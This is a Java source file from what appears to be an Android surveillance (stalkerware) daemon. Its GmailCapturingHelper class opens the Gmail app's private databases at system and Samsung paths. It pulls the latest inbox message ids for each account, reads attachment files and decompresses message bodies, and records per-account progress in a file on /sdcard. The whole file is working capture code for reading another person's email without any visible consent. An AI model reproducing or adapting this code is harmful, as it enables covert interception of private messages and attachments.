package com.vvt.daemon.email;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.zip.InflaterInputStream;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;

import com.fx.daemon.Customization;
import com.vvt.database.VtDatabaseHelper;
import com.vvt.ioutil.FileUtil;
import com.vvt.ioutil.Persister;
import com.vvt.logger.FxLog;

class GmailCapturingHelper {
	
	private static final String TAG = "GmailCapturingHelper";
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private static final String PKG_PROVIDERS = "com.google.android.providers.gmail";
	private static final String PKG_GM = "com.google.android.gm";
	
	static final String DEFAULT_DATE_FORMAT = "dd/MM/yy HH:mm:ss";
	static final String DEFAULT_PATH = "/sdcard/data/data/com.vvt.im";
	static final String LOG_FILE_NAME = "gmail.ref";
	
	public static String[] getAllPossiblePaths() {
		String[] allPaths = new String[4];
		String path = null;
		
		path = String.format("%s/%s/databases", VtDatabaseHelper.GENERAL_SYSTEM_DB, PKG_PROVIDERS);
		allPaths[0] = path;
		
		path = String.format("%s/%s/databases", VtDatabaseHelper.GENERAL_SYSTEM_DB, PKG_GM);
		allPaths[1] = path;
		
		path = String.format("%s/%s", VtDatabaseHelper.SAMSUNG_SYSTEM_DB, PKG_PROVIDERS);
		allPaths[2] = path;
		
		path = String.format("%s/%s", VtDatabaseHelper.SAMSUNG_SYSTEM_DB, PKG_GM);
		allPaths[3] = path;
		
		return allPaths;
	}
	
	public static long getMessageLatestId(String gmailDbPath, String account) {
			SQLiteDatabase db = 
					GmailDatabaseHelper.getReadableDatabase(
							GmailDatabaseHelper.getGmailAccountDbPath(
									gmailDbPath, account));
			
			if (db == null || db.isDbLockedByCurrentThread() || db.isDbLockedByOtherThreads()) {
				if (LOGD) FxLog.d(TAG, "getMessageLatestId # Open database FAILED!! -> EXIT ...");
				if (db != null) {
					db.close();
				}
				return 0;
			}
			
			String sqlGetAll = String.format(
					"SELECT %s.%s AS mid, %s.%s AS m_label_id,* FROM %s " +
					"LEFT JOIN %s ON %s = %s " +
					"LEFT JOIN %s ON %s = %s.%s " +
					"WHERE (%s = '%s' OR %s = '%s') AND %s = 1 AND %s = 0 " +
					"ORDER BY %s DESC",
					GmailDatabaseHelper.TABLE_MESSAGES, GmailDatabaseHelper.COLUMN_ID,
					GmailDatabaseHelper.TABLE_MESSAGE_LABELS,GmailDatabaseHelper.COLUMN_ID,
					GmailDatabaseHelper.TABLE_MESSAGES, 
					GmailDatabaseHelper.TABLE_MESSAGE_LABELS, 
					GmailDatabaseHelper.COLUMN_MSG_ID, GmailDatabaseHelper.COLUMN_MSG_MSG_ID, 
					GmailDatabaseHelper.TABLE_LABELS, GmailDatabaseHelper.COLUMN_LABELS_ID, 
					GmailDatabaseHelper.TABLE_LABELS, GmailDatabaseHelper.COLUMN_ID, 
					GmailDatabaseHelper.COLUMN_NAME, "^i", 
					GmailDatabaseHelper.COLUMN_NAME, "^f",
					GmailDatabaseHelper.COLUMN_SYNCED, GmailDatabaseHelper.COLUMN_CLIENT_CREATED,
					"m_label_id");
			
			String sqlGetMaxId = String.format(
					"SELECT MAX(%s) AS refId FROM (%s) ", "m_label_id", sqlGetAll);
	
			Cursor cursor = null;
			long id = 0;
			
			try {
				cursor = db.rawQuery(sqlGetMaxId, null);
				
				if (cursor == null || cursor.getCount() == 0) {
					if (LOGD) FxLog.d(TAG, "getMessageLatestId # Query database FAILED!! -> EXIT ...");
					if (cursor != null) {
						cursor.close();
					}
					db.close();
					return 0;
				}
				
				if (cursor.moveToNext()) {
					id = cursor.getLong(0);
				}
			}
			catch (Exception e) {
				if (LOGE) FxLog.e(TAG, String.format("getMessageLatestId # Error: %s", e));
			}
			finally {
				if (cursor != null) cursor.close();
				if (db != null) db.close();
			}
			
			if(LOGV) FxLog.v(TAG, String.format(
					"getMessageLatestId # account: %s, id: %d", account, id));
			
			return id;
		}

	// TODO : Upgrade to capture raw data in near future.
	public static List<GmailAttachment> getAttachmentData(SQLiteDatabase db, long messageId, String gmailDbPath) {
		if (LOGV) FxLog.v(TAG, "getAttachmentData # ENTER... ");
		
		List<GmailAttachment> attachments = new ArrayList<GmailAttachment>();
		String sql = String.format("SELECT %s FROM %s WHERE %s = %s",
				GmailDatabaseHelper.COLUMN_DOWNLOAD_ID,
				GmailDatabaseHelper.TABLE_ATTACHMENT,
				GmailDatabaseHelper.COLUMN_MSGS_MSG_ID, messageId);
	
		if (LOGV) FxLog.v(TAG, String.format("getAttachmentData # sql: %s", sql));
		
		Cursor cursor = null;
		List<Long> ids = new ArrayList<Long>();
		
		try {
			cursor = db.rawQuery(sql, null);
			
			if (cursor != null) {
				while (cursor.moveToNext()) {
					ids.add(cursor.getLong(0));
				}
			}
		}
		catch (Exception e) {
			if (LOGE) FxLog.e(TAG, String.format("getAttachmentData # Error: %s", e));
		}
		finally {
			if (cursor != null) cursor.close();
		}
	
		if (ids.size() > 0) {
			attachments = readAttachmentData(gmailDbPath, ids);
		}
		
		if (LOGV) FxLog.v(TAG, "getAttachmentData # EXIT...");
		return attachments;
	}

	public static long getPersistedRefId(String account, String loggablePath) {
		HashMap<String, Long> refIds = getPersistedRefIds(loggablePath);
		return refIds.containsKey(account) ? refIds.get(account) : 0;
	}

	public static void updatePersistedRefId(String account, long refId, String loggablePath) {
		if(LOGD) FxLog.d(TAG, String.format(
					"updatePersistedRefId # account=%s, refId=%d", account, refId));
		
		// Get refIds as Map
		HashMap<String, Long> refIds = getPersistedRefIds(loggablePath);
		
		// Update refId for specific account
		refIds.put(account, refId);
		
		// Write it back
		if (loggablePath == null) {
			loggablePath = DEFAULT_PATH;
		}
		String pathOutput = String.format("%s/%s", loggablePath, LOG_FILE_NAME);
		Persister.persistObject(convertToString(refIds), pathOutput);
	}

	private static List<GmailAttachment> readAttachmentData(String gmailDbPath, List<Long> downloadIds) {
		if (LOGV) FxLog.v(TAG, "readAttachmentData # ENTER...");
		
		List<GmailAttachment> attachments = new ArrayList<GmailAttachment>();
		
		SQLiteDatabase db = 
				GmailDatabaseHelper.getReadableDatabase(
						GmailDatabaseHelper.getGmailDownloadsDbPath(gmailDbPath));
		
		if (db == null) {
			if (LOGD) FxLog.d(TAG, "readAttachmentData # Open database FAILED!! -> EXIT ...");
			return attachments;
		}

		GmailAttachment attachment = null;
		byte[] imgData = null;
		String sql = "";
		Cursor cursor = null;

		for (long id : downloadIds) {
			sql = String.format("SELECT %s, %s FROM %s WHERE %s = %s",
					GmailDatabaseHelper.COLUMN_DATA,
					GmailDatabaseHelper.COLUMN_TITLE,
					GmailDatabaseHelper.TABLE_DOWNLOADS,
					GmailDatabaseHelper.COLUMN_ID, id);

			if (LOGV) FxLog.v(TAG, "readAttachmentData # " + sql);

			try {
				cursor = db.rawQuery(sql, null);

				if (cursor != null) {
					attachment = new GmailAttachment();

					if (cursor.moveToNext()) {
						String path = cursor.getString(
								cursor.getColumnIndex(GmailDatabaseHelper.COLUMN_DATA));
						
						String fileName = cursor.getString(
								cursor.getColumnIndex(GmailDatabaseHelper.COLUMN_TITLE));

						imgData = new byte[] {};
						
						if (path != null) {
							File file = new File(path);
							if (file.exists()) {
								imgData = FileUtil.readFileData(path);
							}
							else {
								if (LOGD) FxLog.d(TAG, "readAttachmentData # " + path + " File not exists");
								continue;
							}
						}
						else {
							if (LOGV) FxLog.w(TAG, "readAttachmentData # " + path + " is null");
							continue;
						}

						if (LOGV) FxLog.v(TAG, "readAttachmentData # Add attachment ");
						attachment.setAttachemntFullName(fileName);
						attachment.setAttachmentData(imgData);
						attachments.add(attachment);
					} // cursor move to next
				} // cursor is not null
			}
			catch (Exception e) {
				if (LOGE) FxLog.e(TAG, String.format("readAttachmentData # Error: %s", e));
			}
			finally {
				if (cursor != null) cursor.close();
				if (db != null) db.close();
			}
		}
		
		if (LOGV) FxLog.v(TAG, "readAttachmentData # attachments site ..." + attachments.size());
		if (LOGV) FxLog.v(TAG, "readAttachmentData # EXIT...");
		return attachments;
	}

	private static HashMap<String, Long> getPersistedRefIds(String loggablePath) {
		if (loggablePath == null) {
			loggablePath = DEFAULT_PATH;
		}
		
		String dataRefIds = (String) Persister.deserializeToObject(
				String.format("%s/%s", loggablePath, LOG_FILE_NAME));
		
		HashMap<String, Long> refDates = new HashMap<String, Long>();
		if (dataRefIds != null) {
			String[] restoreArray = dataRefIds.split(", ");
			String[] temp;
			for (String item : restoreArray) {
				temp = item.split("=");
				if (temp.length > 1) {
					refDates.put(temp[0], Long.parseLong(temp[1]));
				}
			}
		}
		return refDates;
	}
	
	private static String convertToString(HashMap<String, Long> refIds) {
		if (refIds == null) {
			return null;
		}
		String refDatesString = refIds.toString();
		return refDatesString.substring(1, refDatesString.length() - 1);
	}
	
	public static String getUncompressedContent(byte[] input) {
		StringBuffer buff = new StringBuffer();
        
		InflaterInputStream in = null;
		try {
        	in = new InflaterInputStream(new ByteArrayInputStream(input));
        	BufferedReader reader = new BufferedReader(new InputStreamReader(in, "UTF-8"));
        	
        	String line = null;
        	while ((line = reader.readLine()) != null) {
        		buff.append(line);
        	}
        }
        catch (IOException e) {
        	if(LOGE) FxLog.e(TAG, e.getMessage(), e);
        }
		finally {
			try { if (in != null) in.close(); }
			catch (Exception e) { /* ignore */ }
		}
        return buff.toString();
	}
	
	// getCleanedEmailBody(String input): String is removed
	// Call FxStringUtils.removeHtmlTags() instead
	
}
